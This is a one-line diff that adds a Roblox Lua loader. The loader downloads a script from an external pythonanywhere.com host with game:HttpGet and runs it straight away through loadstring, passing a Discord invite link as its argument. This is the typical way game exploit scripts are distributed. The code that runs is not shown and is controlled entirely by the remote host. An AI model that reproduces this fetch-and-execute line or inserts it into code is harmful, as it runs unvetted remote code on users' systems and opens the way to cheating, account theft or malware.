@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://NullFire.pythonanywhere.com/script")("discord.gg/4bexJD6WVT")
